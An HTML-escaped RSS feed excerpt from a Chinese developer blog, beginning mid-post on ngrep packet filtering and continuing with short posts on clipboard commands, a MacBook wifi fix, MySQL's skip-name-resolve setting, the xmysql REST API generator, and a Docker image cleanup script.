&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;interface: eth0 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;192.168.1.0/255.255.255.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;filter: &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ip or ip6&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; and &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt; host 192.168.60.200 &lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;####&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;T 192.168.1.102:39510 -&amp;gt; 192.168.60.200:7775 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;AP&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;GET / HTTP/1.1.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Host: 192.168.60.200:7775.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User-Agent: curl/7.52.1.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Accept: */*.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;T 192.168.60.200:7775 -&amp;gt; 192.168.1.102:39510 &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;AP&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;HTTP/1.1 &lt;span style=&#34;color:#ae81ff&#34;&gt;302&lt;/span&gt; Moved Temporarily.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: Apache-Coyote/1.1.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Set-Cookie: JSESSIONID&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;211CA612EC681B9FDCE7726B03F42088; Path&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;/; HttpOnly.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Location: http://192.168.60.200:7775/homepage.action.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Type: text/html.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Content-Length: 0.
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Date: Fri, &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; Aug &lt;span style=&#34;color:#ae81ff&#34;&gt;2019&lt;/span&gt; 02:16:51 GMT.
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;过滤规则&#34;&gt;过滤规则&lt;/h1&gt;
&lt;h2 id=&#34;按ip地址过滤&#34;&gt;按IP地址过滤&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ngrep -W byline host 192.168.60.200 &lt;span style=&#34;color:#75715e&#34;&gt;# 源地址或者目的地址是 192.168.60.200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;按端口过滤&#34;&gt;按端口过滤&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ngrep -W byline port &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;# 源端口或者目的端口是 80&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;按照正则匹配&#34;&gt;按照正则匹配&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ngrep -W byline -q HTTP &lt;span style=&#34;color:#75715e&#34;&gt;# 匹配所有包中含有HTTP的&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;指定网卡&#34;&gt;指定网卡&lt;/h1&gt;
&lt;p&gt;默认情况下，ngrep使用网卡列表中的一个网卡，当然你也可以使用-d选项来指定抓包某个网卡。&lt;/p&gt;</description>
    </item>
    <item>
      <title>在不打开文件，将全文复制到剪贴板</title>
      <link>https://wdd.js.org/posts/2019/08/iyotwd/</link>
      <pubDate>Fri, 16 Aug 2019 09:25:37 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/iyotwd/</guid>
      <description>&lt;p&gt;一般拷贝全文分为以下几步&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;使用编辑器打开文件&lt;/li&gt;
&lt;li&gt;全文选择文件&lt;/li&gt;
&lt;li&gt;执行拷贝命令&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;实际上操作系统提供了一些命令，可以在不打开文件的情况下，将文件内容复制到剪贴板。&lt;/p&gt;
&lt;h1 id=&#34;mac-pbcopy&#34;&gt;mac pbcopy&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aaa&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;pbcopy&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;linuxxsel&#34;&gt;linux xsel&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aaa&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;xsel&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;windows-clip&#34;&gt;windows clip&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cat&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;aaa&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;|&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;clip&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>macbook pro 开机后wifi无响应问题调研</title>
      <link>https://wdd.js.org/posts/2019/08/gw9eka/</link>
      <pubDate>Thu, 15 Aug 2019 08:48:22 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/gw9eka/</guid>
      <description>&lt;h1 id=&#34;解决方案&#34;&gt;解决方案&lt;/h1&gt;
&lt;h2 id=&#34;方案1&#34;&gt;方案1：&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sudo&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;kill&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`ps aux | grep -v grep | grep /usr/libexec/airportd | awk &amp;#39;{print $2}&amp;#39;`&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;或者任务管理器搜索并且杀掉&lt;!-- raw HTML omitted --&gt;airportd这个进程&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://discussionschinese.apple.com/thread/140138832?answerId=140339277322#140339277322&#34;&gt;https://discussionschinese.apple.com/thread/140138832?answerId=140339277322#140339277322&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.v2ex.com/t/505737&#34;&gt;https://www.v2ex.com/t/505737&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://blog.csdn.net/Goals1989/article/details/88578012&#34;&gt;https://blog.csdn.net/Goals1989/article/details/88578012&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>mysql远程连接速度太慢</title>
      <link>https://wdd.js.org/posts/2019/08/kieuga/</link>
      <pubDate>Thu, 08 Aug 2019 16:56:12 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/kieuga/</guid>
      <description>&lt;p&gt;编辑/etc/my.cnf，增加skip-name-resolve&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;skip-name-resolve
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启mysql&lt;/p&gt;</description>
    </item>
    <item>
      <title>xmysql 一行命令从任何mysql数据库生成REST API</title>
      <link>https://wdd.js.org/posts/2019/08/vv5oro/</link>
      <pubDate>Tue, 06 Aug 2019 13:56:20 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/vv5oro/</guid>
      <description>&lt;p&gt;github向我推荐这个&lt;a href=&#34;https://github.com/o1lab/xmysql&#34;&gt;xmysql&lt;/a&gt;时候，我瞟了一眼它的简介&lt;code&gt;One command to generate REST APIs for any MySql Database&lt;/code&gt;, 说实话这个介绍让我眼前一亮，想想每次向后端的同学要个接口的时候，他们总是要&lt;code&gt;哼哧哼哧&lt;/code&gt;搞个半天给才能我。抱着试试看的心态，我试用了一个疗程，oh不是， 是安装并使用了一下。 说实话，体验是蛮不错的，但是体验一把过后，我想不到这个工具的使用场景，因为&lt;code&gt;你不可能把数据库的所有表都公开出来，让前端随意读写,&lt;/code&gt; 但是试试看总是不错的.&lt;/p&gt;
&lt;h1 id=&#34;1-来吧冒险一次&#34;&gt;1 来吧，冒险一次！&lt;/h1&gt;
&lt;p&gt;&lt;!-- raw HTML omitted --&gt;&lt;code&gt;安装与使用&lt;/code&gt;&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;npm install -g xmysqlxmysql -h localhost -u mysqlUsername -p mysqlPassword -d databaseName浏览器打开：http://localhost:3000， 应该可以看到一堆json&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;2-特点&#34;&gt;2 特点&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;产生REST Api从任何mysql 数据库 🔥🔥&lt;/li&gt;
&lt;li&gt;无论主键，外键，表等的命名规则如何，都提供API 🔥🔥&lt;/li&gt;
&lt;li&gt;支持复合主键 🔥🔥&lt;/li&gt;
&lt;li&gt;REST API通常使用：CRUD，List，FindOne，Count，Exists，Distinct&lt;!-- raw HTML omitted --&gt;批量插入，批量删除，批量读取 🔥&lt;/li&gt;
&lt;li&gt;关联表&lt;/li&gt;
&lt;li&gt;翻页&lt;/li&gt;
&lt;li&gt;排序&lt;/li&gt;
&lt;li&gt;按字段过滤 🔥&lt;/li&gt;
&lt;li&gt;行过滤 🔥&lt;/li&gt;
&lt;li&gt;综合功能&lt;/li&gt;
&lt;li&gt;Group By, Having (as query params) 🔥🔥&lt;/li&gt;
&lt;li&gt;Group By, Having (as a separate API) 🔥🔥&lt;/li&gt;
&lt;li&gt;Multiple group by in one API 🔥🔥🔥🔥&lt;/li&gt;
&lt;li&gt;Chart API for numeric column 🔥🔥🔥🔥🔥🔥&lt;/li&gt;
&lt;li&gt;Auto Chart API - (a gift for lazy while prototyping) 🔥🔥🔥🔥🔥🔥&lt;/li&gt;
&lt;li&gt;XJOIN - (Supports any number of JOINS) 🔥🔥🔥🔥🔥🔥🔥🔥🔥&lt;/li&gt;
&lt;li&gt;Supports views&lt;/li&gt;
&lt;li&gt;Prototyping (features available when using local MySql server only)&lt;/li&gt;
&lt;li&gt;Run dynamic queries 🔥🔥🔥&lt;/li&gt;
&lt;li&gt;Upload single file&lt;/li&gt;
&lt;li&gt;Upload multiple files&lt;/li&gt;
&lt;li&gt;Download file&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;3-api-概览&#34;&gt;3 API 概览&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;HTTP Type&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;API URL&lt;/th&gt;
          &lt;th style=&#34;text-align: left&#34;&gt;Comments&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Gets all REST APIs&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Lists rows of table&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;POST&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Create a new row&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;PUT&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Replaces existing row with new row&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;POST :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/bulk&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Create multiple rows - send object array in request body&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/bulk&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Lists multiple rows - /api/tableName/bulk?_ids=1,2,3&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;DELETE :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/bulk&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Deletes multiple rows - /api/tableName/bulk?_ids=1,2,3&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/:id&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Retrieves a row by primary key&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;PATCH&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/:id&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Updates row element by primary key&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;DELETE&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/:id&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Delete a row by primary key&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/findOne&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Works as list but gets single record matching criteria&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/count&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Count number of rows in a table&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/distinct&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Distinct row(s) in table - /api/tableName/distinct?_fields=col1&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/:id/exists&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;True or false whether a row exists or not&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#relational-tables&#34;&gt;/api/parentTable/:id/childTable&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Get list of child table rows with parent table foreign key&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#aggregate-functions&#34;&gt;/api/tableName/aggregate&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Aggregate results of numeric column(s)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#group-by-having-as-api&#34;&gt;/api/tableName/groupby&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Group by results of column(s)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#union-of-multiple-group-by-statements&#34;&gt;/api/tableName/ugroupby&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Multiple group by results using one call&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#chart&#34;&gt;/api/tableName/chart&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Numeric column distribution based on (min,max,step) or(step array) or (automagic)&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#autochart&#34;&gt;/api/tableName/autochart&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;Same as Chart but identifies which are numeric column automatically - gift for lazy while prototyping&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#xjoin&#34;&gt;/api/xjoin&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;handles join&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#run-dynamic-queries&#34;&gt;/dynamic&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;execute dynamic mysql statements with params&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#upload-single-file&#34;&gt;/upload&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;upload single file&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#upload-multiple-files&#34;&gt;/uploads&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;upload multiple files&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET :fire:&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;&lt;a href=&#34;https://wdd.js.org/readme-of-xmysql.html#download-file&#34;&gt;/download&lt;/a&gt;&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;download a file&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tableName/describe&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;describe each table for its columns&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;GET&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;/api/tables&lt;/td&gt;
          &lt;td style=&#34;text-align: left&#34;&gt;get all tables in database&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;3-更多资料&#34;&gt;3 更多资料&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;项目地址：&lt;a href=&#34;https://github.com/o1lab/xmysql&#34;&gt;https://github.com/o1lab/xmysql&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>Jenkins 全局变量参考</title>
      <link>https://wdd.js.org/posts/2019/08/tdeab2/</link>
      <pubDate>Tue, 06 Aug 2019 13:48:59 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2019/08/tdeab2/</guid>
      <description>&lt;h1 id=&#34;docker&#34;&gt;docker&lt;/h1&gt;
&lt;p&gt;The docker variable offers convenient access to Docker-related functions from a Pipeline script.&lt;!-- raw HTML omitted --&gt;Methods needing a slave will implicitly run a node {…} block if you have not wrapped them in one. It is a good idea to enclose a block of steps which should all run on the same node in such a block yourself. (If using a Swarm server, or any other specific Docker server, this probably does not matter, but if you are using the default server on localhost it likely will.)&lt;!-- raw HTML omitted --&gt;Some methods return instances of auxiliary classes which serve as holders for an ID and which have their own methods and properties. Methods taking a body return any value returned by the body itself. Some method parameters are optional and are enclosed with []. Reference:&lt;/p&gt;</description>
    </item>
    <item>
      <title>Docker镜像批量清理脚本</title>
      <link>https://wdd.js.org/shell/docker-clean-tips/</link>
      <pubDate>Tue, 06 Aug 2019 13:48:13 +0800</pubDate>
      <guid>https://wdd.js.org/shell/docker-clean-tips/</guid>
      <description>&lt;p&gt;使用 jenkins 作为打包的工具，主机上的磁盘空间总是被慢慢被占满，直到 jenkins 无法运行。本文从几个方面来清理 docker 垃圾。&lt;/p&gt;
&lt;h1 id=&#34;批量删除已经退出的容器&#34;&gt;批量删除已经退出的容器&lt;/h1&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker ps -a | grep &amp;#34;Exited&amp;#34; | awk &amp;#39;{print $1 }&amp;#39; | xargs docker rm
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;批量删除带有-none-字段的镜像&#34;&gt;批量删除带有 none 字段的镜像&lt;/h1&gt;
&lt;p&gt;$3 一般就是取出每一行的镜像 id 字段&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;# 方案1： 根据镜像id删除镜像
docker images| grep none |awk &amp;#39;{print $3 }&amp;#39;|xargs docker rmi
# 方案2: 根据镜像名删除镜像
docker images | grep wecloud | awk &amp;#39;{print $1&amp;#34;:&amp;#34;$2}&amp;#39; | xargs docker rmi
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;方案 1，根据镜像 ID 删除镜像时，有写镜像虽然镜像名不同，但是镜像 ID 都是相同的，这是后往往会删除失败。所以根据镜像名删除镜像的效果会更好。&lt;/p&gt;
&lt;h1 id=&#34;删除镜像定时任务脚本&#34;&gt;删除镜像定时任务脚本&lt;/h1&gt;
